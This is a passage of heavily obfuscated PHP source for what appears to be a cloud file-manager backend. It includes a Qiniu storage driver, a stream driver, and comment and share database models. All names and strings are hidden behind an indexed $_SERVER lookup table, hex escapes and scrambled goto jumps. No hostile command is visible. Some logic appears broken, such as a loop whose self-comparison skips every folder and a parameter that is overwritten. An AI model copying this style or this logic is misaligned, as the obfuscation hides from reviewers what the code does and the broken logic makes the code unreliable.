= $this->bucketManager->{$_SERVER[拘][308]}($this->bucket, $a); return $Bޚ ? !1 : !0; } public function delFolder($cˍЫ) { goto D뙶; Aҍ: $f = 1000; if ($b[37]($F) <= $f) { return $this->{$_SERVER[拘][941]}($F) ? !1 : !0; } foreach ($b[765]($F, $f) as $eѭފ) { $A = $this->{$_SERVER[拘][941]}($eѭފ); if ($A) { return !1; } } goto C㣭; D뙶: $b =& $_SERVER[拘]; $F = $this->{$_SERVER[拘][885]}($cˍЫ); if (empty($F)) { return !0; } goto Aҍ; C㣭: return !0; goto cԍ; cԍ: } private function qnDelObj($b͓) { $d = $this->bucketManager->{$_SERVER[拘][942]}($this->bucket, $b͓); list($FҪǉ, $F̗) = $this->bucketManager->{$_SERVER[拘][943]}($d); return $F̗; } private function fileList($c, $A = 0) { goto A댳; aɵ: $A镙 = $dϏ[67]; $c􂩑 = 1000; $cѓ = $dϏ[67]; goto Cթ¸; A댳: $dϏ =& $_SERVER[拘]; $c = $dϏ[70]($c, $dϏ[44]); $D͜ = empty($c) ? $dϏ[67] : $c . $dϏ[44]; goto aɵ; Cթ¸: $b٤ = array(); while (!0) { list($fƎ, $eӝΪ) = $this->bucketManager->{$_SERVER[拘][944]}($this->bucket, $D͜, $A镙, $c􂩑, $cѓ); if ($eӝΪ) { return !1; } $A镙 = $dϏ[945]($dϏ[872], $fƎ) ? $A镙 = $fƎ[$dϏ[946]] : $dϏ[67]; foreach ($fƎ[$dϏ[947]] as $dЭ) { $bޞ = $dЭ[$dϏ[257]]; if ($A) { $bޞ = array($dϏ[375] => $bޞ, $dϏ[490] => $dЭ[$dϏ[948]]); } $b٤[] = $bޞ; } if ($A镙 == $dϏ[67]) { break; } } return $b٤; goto a劤; a劤: } public function rename($D, $d) { return $this->{$_SERVER[拘][768]}($D, $d); } public function size($AӐ䗞) { $F㩄 =& $_SERVER[拘]; list($Dڤ, $Cԑغ) = $this->bucketManager->{$_SERVER[拘][949]}($this->bucket, $F㩄[70]($AӐ䗞, $F㩄[44])); return isset($Dڤ[$F㩄[948]]) ? $Dڤ[$F㩄[948]] : 0; } public function info($A㷉) { $d¬ϛ =& $_SERVER[拘]; $A㷉 = $d¬ϛ[70]($A㷉, $d¬ϛ[44]); if ($this->{$_SERVER[拘][385]}($A㷉)) { return $this->{$_SERVER[拘][556]}($A㷉, 1); } return $this->{$_SERVER[拘][555]}($A㷉); } public function fileInfo($cʃ, $eӜ = array(), $C׭ = false) { goto C; Cű: return $b; goto eԦš; C: $Bߴ =& $_SERVER[拘]; if ($C׭) { return array($Bߴ[375] => $this->{$_SERVER[拘][392]}($cʃ), $Bߴ[40] => $this->{$_SERVER[拘][378]}($Bߴ[44] . $cʃ), $Bߴ[400] => $Bߴ[18], $Bߴ[490] => isset($eӜ[$Bߴ[948]]) ? $eӜ[$Bߴ[948]] : 0, $Bߴ[565] => $this->{$_SERVER[拘][566]}($cʃ)); } $b = array($Bߴ[375] => $this->{$_SERVER[拘][392]}($cʃ), $Bߴ[40] => $this->{$_SERVER[拘][378]}($Bߴ[44] . $cʃ), $Bߴ[400] => $Bߴ[18], $Bߴ[558] => $Bߴ[168], $Bߴ[559] => $Bߴ[168], $Bߴ[490] => 0, $Bߴ[565] => $this->{$_SERVER[拘][566]}($cʃ), $Bߴ[771] => !0, $Bߴ[717] => !0); goto Aё; Aё: if (empty($eӜ)) { list($eӜ, $D߮) = $this->bucketManager->{$_SERVER[拘][949]}($this->bucket, $cʃ); if ($D߮) { return $b; } $this->{$_SERVER[拘][605]}($cʃ, $b); } $b[$Bߴ[558]] = $Bߴ[7]($eӜ[$Bߴ[950]], 0, -7); $b[$Bߴ[490]] = $eӜ[$Bߴ[948]]; goto Cű; eԦš: } public function folderInfo($BƊ, $C = 0, $A󉣬 = false) { $fĻ𕼂 =& $_SERVER[拘]; if ($A󉣬) { return array($fĻ𕼂[375] => $this->{$_SERVER[拘][392]}($BƊ), $fĻ𕼂[40] => $this->{$_SERVER[拘][378]}($fĻ𕼂[44] . $BƊ), $fĻ𕼂[400] => $fĻ𕼂[557]); } $cط = array($fĻ𕼂[375] => $this->{$_SERVER[拘][392]}($BƊ), $fĻ𕼂[40] => $this->{$_SERVER[拘][378]}($fĻ𕼂[44] . $BƊ), $fĻ𕼂[400] => $fĻ𕼂[557], $fĻ𕼂[558] => $fĻ𕼂[168], $fĻ𕼂[559] => $fĻ𕼂[168], $fĻ𕼂[562] => !1, $fĻ𕼂[564] => !1, $fĻ𕼂[560] => !0, $fĻ𕼂[561] => !0); if ($C) { $cط[$fĻ𕼂[562]] = $this->{$_SERVER[拘][563]}($BƊ, !1); $cط[$fĻ𕼂[564]] = $this->{$_SERVER[拘][563]}($BƊ, !0); } return $cط; } public function exist($bׂ) { if ($this->{$_SERVER[拘][379]}($bׂ) || $this->{$_SERVER[拘][385]}($bׂ)) { return !0; } return !1; } public function isFile($a˥ޘ) { $fަя =& $_SERVER[拘]; list($aȹݐ, $f) = $this->bucketManager->{$_SERVER[拘][949]}($this->bucket, $fަя[70]($a˥ޘ, $fަя[44])); return $f ? !1 : !0; } public function isFolder($a) { goto E; f擎: return !1; goto d; E: $Dľ =& $_SERVER[拘]; $aق = $Dľ[70]($a, $Dľ[44]); if (empty($aق)) { return !0; } goto EԈ; EԈ: $eƊ = $Dľ[70]($a, $Dľ[44]) . $Dľ[44]; $D = $Dľ[67]; $F = 1; goto FĎ; FĎ: $B͌ = $Dľ[44]; list($D, $eɠ˗) = $this->bucketManager->{$_SERVER[拘][944]}($this->bucket, $eƊ, $D, $F, $B͌); if (!empty($D[$Dľ[947]]) || !empty($D[$Dľ[951]])) { return !0; } goto f擎; d: } public function listPath($E, $b = false, $D˥ݦ = false) { goto cƞՌ; a񟊑: $Aȅ = $eޓ[67]; $d = 1000; $DḲߔ = $eޓ[44]; goto c; c: $F˧ = $D = array(); while (!0) { list($c, $dɳ) = $this->bucketManager->{$_SERVER[拘][944]}($this->bucket, $a, $Aȅ, $d, $DḲߔ); if ($dɳ) { return !1; } $Aȅ = $eޓ[945]($eޓ[872], $c) ? $Aȅ = $c[$eޓ[946]] : $eޓ[67]; if (isset($c[$eޓ[951]])) { foreach ($c[$eޓ[951]] as $a) { if ($a == $a) { continue; } $F˧[] = $this->{$_SERVER[拘][556]}($a, $b, $D˥ݦ); } } if (isset($c[$eޓ[947]])) { foreach ($c[$eޓ[947]] as $Cۉ) { if ($Cۉ[$eޓ[257]] == $a) { continue; } $D[] = $this->{$_SERVER[拘][555]}($Cۉ[$eޓ[257]], $Cۉ, $D˥ݦ); } } if ($Aȅ == $eޓ[67]) { break; } } return array($eޓ[399] => $F˧, $eޓ[398] => $D); goto d; cƞՌ: $eޓ =& $_SERVER[拘]; $E = $eޓ[70]($E, $eޓ[44]); $a = empty($E) ? $eޓ[67] : $E . $eޓ[44]; goto a񟊑; d: } public function has($BЕ, $d = true) { goto E; cѼ: while (!0) { list($aۉ, $Aά) = $this->bucketManager->{$_SERVER[拘][944]}($this->bucket, $FȦ, $eև, $eƬ, $e); if ($Aά) { return !1; } $eև = $a[945]($a[872], $aۉ) ? $eև = $aۉ[$a[946]] : $a[67]; if ($d) { if (!empty($aۉ[$a[947]])) { return !0; } } else { if (!empty($aۉ[$a[951]])) { return !0; } } if ($eև == $a[67]) { break; } } return !1; goto Eձ菙; E: $a =& $_SERVER[拘]; $BЕ = $a[70]($BЕ, $a[44]); $FȦ = empty($BЕ) ? $a[67] : $BЕ . $a[44]; goto A֚; A֚: $eև = $a[67]; $eƬ = 100; $e = $a[44]; goto cѼ; Eձ菙: } public function listAll($A) { $eǈك =& $_SERVER[拘]; $fĢ = $this->{$_SERVER[拘][885]}($A, 1); $cމ = array(); foreach ($fĢ as $eԡġ) { $cމ[$eԡġ[$eǈك[375]]] = $eԡġ[$eǈك[490]]; } return $this->{$_SERVER[拘][774]}($A, $eǈك[766]($cމ), $cމ); } public function canRead($c) { return $this->{$_SERVER[拘][389]}($c) ? !0 : !1; } public function canWrite($e) { return $this->{$_SERVER[拘][389]}($e) ? !0 : !1; } public function getContent($b寎ޣ) { return $this->{$_SERVER[拘][509]}($b寎ޣ, 0, -1); } public function setContent($Cć㍓, $Eي = '') { $bї = $this->{$_SERVER[拘][545]}($this->{$_SERVER[拘][392]}($Cć㍓)); $_SERVER[拘][344]($bї, $Eي); if ($this->{$_SERVER[拘][408]}($Cć㍓, $bї)) { $this->{$_SERVER[拘][546]}($bї); return !0; } return !1; } public function refreshUrls($cԶ) { goto a; D: return $bۡˏ[$fӋ[953]] == $fӋ[954] ? !0 : !1; goto eǚ׊; e: $E = new Qiniu\Cdn\CdnManager($this->auth); list($bۡˏ, $dت) = $E->{$_SERVER[拘][952]}($E쿎ҵ); if ($dت) { return !1; } goto D; a: $fӋ =& $_SERVER[拘]; $E쿎ҵ = array(); if ($fӋ[93]($cԶ)) { foreach ($cԶ as $Cۗ⃌) { $E쿎ҵ[] = $this->{$_SERVER[拘][521]}($Cۗ⃌); } } else { $E쿎ҵ[] = $this->{$_SERVER[拘][521]}($cԶ); } goto e; eǚ׊: } public function fileSubstr($Eឈ, $Dх, $B) { $A턍 =& $_SERVER[拘]; if (!$A턍[213]($Eឈ, $this->domain)) { if (!$this->{$_SERVER[拘][379]}($Eឈ)) { return !1; } $Eឈ = $this->{$_SERVER[拘][521]}($Eឈ); } $D = array($A턍[955] => $Dх, $A턍[956] => $B); return $this->{$_SERVER[拘][957]}($Eឈ, $D); } public function upload($Aқ, $F, $c؃ª = false, $Eɐ = REPEAT_REPLACE) { $F׮ = new Qiniu\Storage\UploadManager(); $Fئǝ = $this->auth->{$_SERVER[拘][958]}($this->bucket, $Aқ); list($D, $FΊ) = $F׮->{$_SERVER[拘][959]}($Fئǝ, $Aқ, $F); return $FΊ ? !1 : $this->{$_SERVER[拘][378]}($Aқ); } public function multiUploadFormData($b۷ɴ, $F羌 = 3600) { goto F̚ɛ; F̚ɛ: $bӂξ =& $_SERVER[拘]; $aƃ = $F羌; $Aތ = array($bӂξ[960] => $bӂξ[961]); goto a; a: $D = null; $E = $this->auth->{$_SERVER[拘][958]}($this->bucket, $D, $aƃ, $Aތ, !0); $DטҐ = empty($this->region) || $this->region == $bӂξ[962] ? $bӂξ[67] : $bӂξ[963] . $this->region; goto fđ; fđ: $B榄ҵ = $bӂξ[964]() . "\x3a\57\57\x75\x70\154\157\141\144{$DטҐ}\56\161\x69\156\x69\165\160\56\x63\x6f\x6d\x2f"; return array($bӂξ[965] => $E, $bӂξ[966] => $B榄ҵ); goto e; e: } public function download($eᢋ禐, $b҄) { goto cޮƋқ; D鹼: $fǇ = 0; $fԱЌ = 1024 * 200; $Aޑڦ = $Eߑ[53]($E򟎋, $Eߑ[574]); goto C΂ͅ; cޮƋқ: $Eߑ =& $_SERVER[拘]; $E򟎋 = IO::getPathInner(IO::mkfile($b҄)); if (!($AԾ = $this->{$_SERVER[拘][521]}($eᢋ禐))) { return !1; } goto D鹼; C΂ͅ: while (!0) { $bխ = array($Eߑ[955] => $fǇ, $Eߑ[956] => $fԱЌ); $fԺ = $this->{$_SERVER[拘][957]}($AԾ, $bխ); if ($fǇ && ($D = @$Eߑ[738]($fԺ, !0))) { if (isset($D[$Eߑ[953]])) { return !1; } } $Eߑ[55]($Aޑڦ, $fԺ); $fǇ += $fԱЌ; if ($Eߑ[195]($fԺ) < $fԱЌ) { break; } } $Eߑ[58]($Aޑڦ); return $b҄; goto EզàƑ; EզàƑ: } public function link($C΍, $bèΫ = '') { if (!$this->{$_SERVER[拘][379]}($C΍)) { return !1; } $Cڵɒ = $_SERVER[拘][964]() . "\x3a\57\57{$this->domain}\57{$C΍}" . $bèΫ; return $this->auth->{$_SERVER[拘][967]}($Cڵɒ); } public function fileOut($BЌ, $c = false, $A罔 = false, $Cꐉ = '') { $f٠Ƃ =& $_SERVER[拘]; $c = $this->{$_SERVER[拘][521]}($BЌ, $f٠Ƃ[968] . $f٠Ƃ[655]($A罔)); $f٠Ƃ[657]($f٠Ƃ[815] . $c); die; } public function fileOutImage($B҅, $cŋ = 250) { $fҹ =& $_SERVER[拘]; $aʽ = $this->{$_SERVER[拘][521]}($B҅, $fҹ[969] . $cŋ); $fҹ[657]($fҹ[815] . $aʽ); die; } public function hashMd5($e㑃) { $f̚ǃ =& $_SERVER[拘]; $d膎 = $this->{$_SERVER[拘][521]}($e㑃, $f̚ǃ[970]); $Fʴԙ = $this->{$_SERVER[拘][957]}($d膎, array(), !0); return !isset($Fʴԙ[$f̚ǃ[781]]) ? !1 : $Fʴԙ[$f̚ǃ[781]]; } private function fileInfoImage($Eҽ, &$cː) { $f녂 =& $_SERVER[拘]; if (!$f녂[176]($cː[$f녂[565]], array($f녂[606], $f녂[607], $f녂[608], $f녂[609], $f녂[610]))) { return; } if (!($e = $this->{$_SERVER[拘][521]}($Eҽ, $f녂[971]))) { return !1; } if (!($Bޗ = $this->{$_SERVER[拘][957]}($e, array(), !0))) { return !1; } $cː[$f녂[612]] = array($f녂[613] => $Bޗ[$f녂[613]], $f녂[614] => $Bޗ[$f녂[817]]); } public function qnRequest($F֛, $e䈢 = array(), $Bǟ = false) { goto fѻ; fϽ: $Dړ[973]($bꨑ܅, CURLOPT_RETURNTRANSFER, 1); $Dړ[973]($bꨑ܅, CURLOPT_CONNECTTIMEOUT, 3600); if (isset($e䈢[$Dړ[955]]) && $e䈢[$Dړ[956]] > 0) { $CͿ = $e䈢[$Dړ[955]]; $Fʖ = $e䈢[$Dړ[955]] + ($e䈢[$Dړ[956]] - 1); $Dړ[973]($bꨑ܅, CURLOPT_RANGE, "{$CͿ}\x2d{$Fʖ}"); } goto BÂ; BÂ: $Dړ[973]($bꨑ܅, CURLOPT_FOLLOWLOCATION, 1); $f˻ = $Dړ[974]($bꨑ܅); $Dړ[975]($bꨑ܅); goto Aإ멖; fѻ: $Dړ =& $_SERVER[拘]; $bꨑ܅ = $Dړ[972](); $Dړ[973]($bꨑ܅, CURLOPT_URL, $F֛); goto fϽ; Aإ멖: if ($Bǟ) { return @$Dړ[738]($f˻, !0); } return $f˻; goto a֗ʡ; a֗ʡ: } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Aڇ鿏, $aǑԕ = 0) { $a񩣂Ո =& $_SERVER[拘]; parent::__construct(); $this->source = $Aڇ鿏; $this->sourceSize = $aǑԕ; if ($a񩣂Ո[66]($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = $a񩣂Ո[195]($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($bʍ = false) { return $this->sourceSize; } public function getContent($Fƍ = false) { $A =& $_SERVER[拘]; if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Dޏ = $A[976]($this->source); $D؃ɞ = @$A[577]($this->source, $this->sourceSize); $A[576]($this->source, $Dޏ); return $D؃ɞ; } } public function fileSubstr($aã = false, $A = 0, $a똇֏ = 0) { $e⫂צ =& $_SERVER[拘]; if (!$a똇֏) { $a똇֏ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return $e⫂צ[7]($this->source, $A, $a똇֏); } if ($this->sourceType == self::TYPE_FILE) { $Cìè = $e⫂צ[976]($this->source); $e⫂צ[576]($this->source, $Cìè + $A); $E = @$e⫂צ[577]($this->source, $a똇֏); $e⫂צ[576]($this->source, $Cìè); return $E; } } public function hashMd5($fğޚ = false) { return $_SERVER[拘][46]($this->{$_SERVER[拘][507]}()); } public static function hash($a໗, $Aа = 0) { $cǝÚ = new PathDriverStream($a໗, $Aа); return $cǝÚ->{$_SERVER[拘][651]}($a໗); } public static function md5($F̗, $fĐ = 0) { $d = new PathDriverStream($F̗, $fĐ); return $d->{$_SERVER[拘][616]}($F̗); } } goto Bô; fϔ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\164"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\x6d\x65" => "\x63\x6f\x6d\x6d\x65\156\x74\x5f\155\x65\x74\x61", "\155\x65\x74\x61\106\x69\x65\154\144" => "\143\x6f\x6d\155\145\156\164\111\104"); const TYPE_SHARE = 1; const TYPE_SOURCE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; public function addComment($aپ) { $d =& $_SERVER[拘]; if ($aپ[$d[1618]]) { $b割 = $this->{$_SERVER[拘][501]}(array($d[1619] => $aپ[$d[1618]]))->{$_SERVER[拘][502]}(); $this->{$_SERVER[拘][501]}(array($d[1619] => $aپ[$d[1618]]))->{$_SERVER[拘][1620]}($d[1621], 1); } return $this->{$_SERVER[拘][63]}($aپ); } public function remove($D) { $F񂂋 =& $_SERVER[拘]; $C = array($F񂂋[1619] => $D); $bё = $this->{$_SERVER[拘][501]}($C)->{$_SERVER[拘][502]}(); if ($bё[$F񂂋[1618]]) { $this->{$_SERVER[拘][501]}(array($F񂂋[1619] => $bё[$F񂂋[1618]]))->{$_SERVER[拘][1620]}($F񂂋[1621], -1); } return $this->{$_SERVER[拘][501]}($C)->{$_SERVER[拘][308]}(); } public function edit($C, $c֘) { $E =& $_SERVER[拘]; $A̰ʦ = array($E[1619] => $C); return $this->{$_SERVER[拘][501]}($A̰ʦ)->{$_SERVER[拘][1062]}(array($E[1489] => $c֘)); } public function prasise($F넉) { $c =& $_SERVER[拘]; $CܯÍ = $c[64]($c[1622]); $f = array($c[1619] => $F넉, $c[1445] => USER_ID); $dߎ҃ = $CܯÍ->{$_SERVER[拘][501]}($f)->{$_SERVER[拘][502]}(); if (!$dߎ҃) { $CܯÍ->{$_SERVER[拘][63]}($f); $this->{$_SERVER[拘][501]}(array($c[1619] => $F넉))->{$_SERVER[拘][1620]}($c[1623], 1); } else { $CܯÍ->{$_SERVER[拘][501]}($f)->{$_SERVER[拘][308]}(); $this->{$_SERVER[拘][501]}(array($c[1619] => $F넉))->{$_SERVER[拘][1620]}($c[1623], -1); } } public function targetInfo($e, $A) { goto b; b: $Eګף =& $_SERVER[拘]; $FβÍ = array($Eګף[1624] => $e, $Eګף[1625] => $A); $fΜ = $this->{$_SERVER[拘][501]}($FβÍ)->{$_SERVER[拘][1152]}(); goto eϰ; eϰ: $f = "\122\111\x47\110\124\40\112\x4f\x49\116\40{$this->tablePrefix}\143\157\155\155\x65\x6e\x74\137\x70\162\141\x69\x73\x65\40\x73\164\x61\162\40\x6f\x6e\x20\143\157\155\155\145\156\x74\56\x63\157\155\x6d\x65\x6e\x74\x49\x44\x20\x3d\40\163\164\x61\162\x2e\143\x6f\x6d\155\x65\156\x74\111\x44"; $d = $this->{$_SERVER[拘][1626]}($Eګף[244])->{$_SERVER[拘][501]}($FβÍ)->{$_SERVER[拘][1627]}($f, $Eګף[1628])->{$_SERVER[拘][1152]}(); $cǝ = array($Eګף[1629] => $fΜ, $Eګף[1630] => $d); goto Bʠ̗; Bʠ̗: return $cǝ; goto dʵѵ; dʵѵ: } public function listData($f, $F򌐋) { $E =& $_SERVER[拘]; $cʤ = array($E[1624] => $f, $E[1625] => $F򌐋, $E[1631] => 0); return $this->{$_SERVER[拘][1632]}($cʤ); } public function listChildren($c) { return $this->{$_SERVER[拘][1632]}(array($_SERVER[拘][1631] => $c)); } private function _listData($B觳) { $F͌ =& $_SERVER[拘]; $aג̄ = $this->{$_SERVER[拘][501]}($B觳)->{$_SERVER[拘][1608]}()->{$_SERVER[拘][1508]}(100); $this->{$_SERVER[拘][1633]}($aג̄[$F͌[1155]]); $this->{$_SERVER[拘][1634]}($aג̄[$F͌[1155]]); return $aג̄; } private function _makeOrder() { $Dџ =& $_SERVER[拘]; $dл = array($Dџ[1623], $Dџ[1621], $Dџ[559]); $AЯն = Input::get($Dџ[1635], $Dџ[359], $Dџ[1636], $dл); $F = Input::get($Dџ[1604], $Dџ[359], $Dџ[1491], array($Dџ[1637], $Dџ[1511])); $Eܹ = $AЯն . $Dџ[168] . $F; return $this->{$_SERVER[拘][1450]}($Eܹ); } private function _listAppendParent(&$d) { $D۷ =& $_SERVER[拘]; $Dψ = $D۷[710]($D۷[413]($d, $D۷[67], $D۷[1618])); $Dψ = $D۷[1478]($Dψ, $D۷[163]); $Eˋ = $this->{$_SERVER[拘][501]}(array($D۷[1619] => array($D۷[359], $Dψ)))->{$_SERVER[拘][1042]}(); $Eˋ = $D۷[413]($Eˋ, $D۷[1638]); foreach ($d as &$F啮) { if (isset($Eˋ[$F啮[$D۷[1618]]])) { $F啮[$D۷[1639]] = $Eˋ[$F啮[$D۷[1618]]]; } } } private function _listAppendUser(&$Dο) { goto cڌˇ; d: $D = $this->{$_SERVER[拘][501]}(array($E݉[1619] => array($E݉[359], $eκ)))->{$_SERVER[拘][1042]}(); $D = $E݉[413]($D, $E݉[1638]); foreach ($Dο as $f) { $eκ[] = $f[$E݉[1512]]; if (isset($f[$E݉[1639]])) { $eκ[] = $f[$E݉[1639]][$E݉[1512]]; } } goto DЎ; cڌˇ: $E݉ =& $_SERVER[拘]; $eκ = array(); $eκ = $E݉[1478]($eκ, $E݉[163]); goto d; DЎ: $c͂풪 = $E݉[64]($E݉[1513])->{$_SERVER[拘][1640]}($eκ); foreach ($Dο as &$f) { $f[$E݉[1518]] = $c͂풪[$f[$E݉[1512]]]; if (isset($f[$E݉[1639]])) { $f[$E݉[1639]][$E݉[1518]] = $c͂풪[$f[$E݉[1639]][$E݉[1512]]]; } } goto eǔϳ; eǔϳ: } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\155\137\157\160\x74\151\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\x6c\145", "\162\x6f\154\x65\x47\x72\157\165\x70", "\x72\x65\x67\x69\163\164", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($f) { return "\123\171\x73\164\145\155\117\160\x74\151\157\x6e\137{$f}"; } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\124\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\164\54\165\x70\144\x61\x74\145", "\x66\165\156\x63\x74\151\157\x6e"), array("\143\162\x65\x61\164\x65\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x6f\x70\164\x69\157\156\x73", '', "\x69\156\163\145\x72\x74\54\165\x70\x64\x61\x74\145\54\x73\145\x6c\145\143\x74", "\x6a\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($fу) { $aׄˣ =& $_SERVER[拘]; $F탺ѹ = isset($fу[0]) ? $fу[0] : !1; return array($aׄˣ[1641] => array(USER_ID, $aׄˣ[1642]), $aׄˣ[1643] => array($F탺ѹ, $aׄˣ[1644])); } protected function listSimple() { $aڛڿ = array($_SERVER[拘][1512] => USER_ID); $C򑘸 = $this->{$_SERVER[拘][1164]}($this->fieldList)->{$_SERVER[拘][501]}($aڛڿ)->{$_SERVER[拘][1042]}(); return $C򑘸 ? $C򑘸 : array(); } protected function getInfo($d֍, $C = false) { $C =& $_SERVER[拘]; if ($C) { return $this->{$_SERVER[拘][1645]}(array($C[1646] => $d֍)); } $dƂ = $this->{$_SERVER[拘][1147]}($C[1647], $d֍); return $dƂ; } public function getInfoByHash($fɟ) { return $this->{$_SERVER[拘][1645]}(array($_SERVER[拘][1648] => $fɟ)); } public function getInfoByPath($b) { $D̪ߣВ =& $_SERVER[拘]; $Bﬓ҇ = array($D̪ߣВ[1512] => USER_ID, $D̪ߣВ[499] => $b); return $this->{$_SERVER[拘][1645]}($Bﬓ҇); } private function _getShareInfo($f򍒐) { goto eޅ; eڃ: $f򍒐 = array($a[1646] => $Aʮř[$a[1646]]); $B۟ = $a[1649]; $D̈́仲 = $a[64]($a[1650])->{$_SERVER[拘][1450]}($a[414])->{$_SERVER[拘][1164]}($B۟)->{$_SERVER[拘][501]}($f򍒐)->{$_SERVER[拘][1042]}(); goto D螚ל; eޅ: $a =& $_SERVER[拘]; $Aʮř = $this->{$_SERVER[拘][501]}($f򍒐)->{$_SERVER[拘][502]}(); if (!$Aʮř) { return !1; } goto eڃ; D螚ל: $Aʮř[$a[1516]] = $a[64]($a[480])->{$_SERVER[拘][495]}($Aʮř[$a[499]]); $Aʮř[$a[1651]] = $D̈́仲; return $Aʮř; goto a; a: } protected function getInfoAuth($dо) { $b㷝 =& $_SERVER[拘]; $f = $this->{$_SERVER[拘][1652]}($dо); $f[$b㷝[317]] = $b㷝[64]($b㷝[1653])->{$_SERVER[拘][1654]}($f[$b㷝[1651]]); return $f; } protected function listData($b = null, $Bǉ = 300) { $d崔 =& $_SERVER[拘]; $E = array(array($d崔[1655] => array($d崔[198], 0), $d崔[1656] => array($d崔[198], 0), $d崔[1657] => $d崔[1658])); if ($b == 1) { $E = array($d崔[1655] => 1); } else { if ($b == 2) { $E = array($d崔[1656] => 1); } } $E[$d崔[1512]] = USER_ID; $cѭ = $this->{$_SERVER[拘][501]}($E)->{$_SERVER[拘][1508]}($Bǉ); return $cѭ; } protected function listToMe($Aų = 300) { goto C; a: $D奜 = $Dј[1662]($a[$Dј[1155]], $Dј[1646]); if (!$D奜) { return $a; } $AģƢ = $Dј[1663]; goto B; D崢: $b瘈Ј = array(array($Dј[1624] => SourceModel::TYPE_USER, $Dј[1661] => USER_ID), array($Dј[1624] => SourceModel::TYPE_GROUP, $Dј[1661] => array($Dј[359], $C몸ݾ)), $Dј[1657] => $Dј[1658]); if ($Dј[37]($C몸ݾ) == 0) { $b瘈Ј = array($Dј[1624] => SourceModel::TYPE_USER, $Dј[1661] => USER_ID); } $a = $Dј[64]($Dј[1650])->{$_SERVER[拘][501]}($b瘈Ј)->{$_SERVER[拘][1508]}($Aų); goto a; C: $Dј =& $_SERVER[拘]; $B = Session::get($Dј[1659]); $C몸ݾ = $Dј[413]($B, $Dј[67], $Dј[1660]); goto D崢; C߰: $Fĝ̐ = array($Dј[1664] => $bǨю֐, $Dј[1665] => $a[$Dј[1156]]); return $Fĝ̐; goto eمϷ; B: $b瘈Ј = array($Dј[1646] => array($Dј[1471], $Dј[766]($D奜))); $bǨю֐ = $this->{$_SERVER[拘][1164]}($AģƢ)->{$_SERVER[拘][501]}($b瘈Ј)->{$_SERVER[拘][1042]}(); foreach ($bǨю֐ as $eد => &$D蘅) { $D蘅[$Dј[1651]] = $D奜[$D蘅[$Dј[1646]]]; } goto C߰; eمϷ: } protected function shareAdd($cč, $f) { $cЩʺ =& $_SERVER[拘]; $eЈ = $this->{$_SERVER[拘][1666]}($cč, $f); if (isset($f[$cЩʺ[1667]]) && $cЩʺ[37]($f[$cЩʺ[1667]]) > 0) { $this->{$_SERVER[拘][1668]}($eЈ, $f[$cЩʺ[1667]]); } $this->{$_SERVER[拘][1669]}($cč, $f, $cЩʺ[1670]); return $eЈ; } private function shareEventAdd($d똮, $fꯊ, $aÌ = "\x61\144\144") { $A텯 =& $_SERVER[拘]; if ($aÌ == $A텯[1670]) { if ($fꯊ[$A텯[1655]] == $A텯[162]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1673]); } if ($fꯊ[$A텯[1656]] == $A텯[162]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1674]); } return; } $fל򌷅 = $this->{$_SERVER[拘][1675]}($d똮); if ($fל򌷅[$A텯[1655]] == $A텯[163] && $fꯊ[$A텯[1655]] == $A텯[162]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1673]); } else { if ($fל򌷅[$A텯[1655]] == $A텯[162] && $fꯊ[$A텯[1655]] == $A텯[163]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1676]); } } if ($fל򌷅[$A텯[1656]] == $A텯[163] && $fꯊ[$A텯[1656]] == $A텯[162]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1674]); } else { if ($fל򌷅[$A텯[1656]] == $A텯[162] && $fꯊ[$A텯[1656]] == $A텯[163]) { $A텯[64]($A텯[1671])->{$_SERVER[拘][1672]}($d똮, $A텯[1677]); } } return; } private function _addShareData($bҏ, $A = array()) { goto Bޛ; F뾊ﾶ: return $f; goto c; cّ: $f = array($C뛣[1445] => USER_ID, $C뛣[1470] => $bҏ, $C뛣[1386] => $C뛣[67], $C뛣[1655] => 0, $C뛣[1656] => 0, $C뛣[98] => $C뛣[67], $C뛣[1678] => 0, $C뛣[1679] => 0, $C뛣[1680] => 0, $C뛣[1681] => $C뛣[67], $C뛣[1648] => $C뛣[67]); $A = $C뛣[4]($C뛣[119], $C뛣[1682]); foreach ($A as $f𛳬) { $f[$f𛳬] = $A[$f𛳬]; } goto bӊ; bӊ: $f = $this->{$_SERVER[拘][63]}($f); $b = array($C뛣[1648] => $C뛣[1683]($f)); $this->{$_SERVER[拘][501]}(array($C뛣[1684] => $f))->{$_SERVER[拘][1062]}($b); goto F뾊ﾶ; Bޛ: $C뛣 =& $_SERVER[拘]; $C۳ = array($C뛣[1470] => $bҏ, $C뛣[1445] => USER_ID); if ($FЛܑ = $this->{$_SERVER[拘][501]}($C۳)->{$_SERVER[拘][502]}()) { return $FЛܑ[$C뛣[1646]]; } goto Fڸ; Fڸ: $bЃ = $C뛣[64]($C뛣[474])->{$_SERVER[拘][491]}($bҏ); if (!$bЃ) { return !1; } if (!$A[$C뛣[1386]]) { $A[$C뛣[1386]] = $bЃ[$C뛣[375]]; } goto cّ; c: } private function _shareAuthSet($B, $c) { goto C; F: return $aΚʘ->{$_SERVER[拘][1161]}($B, array(), !0); goto eឿ; C: $eÓ =& 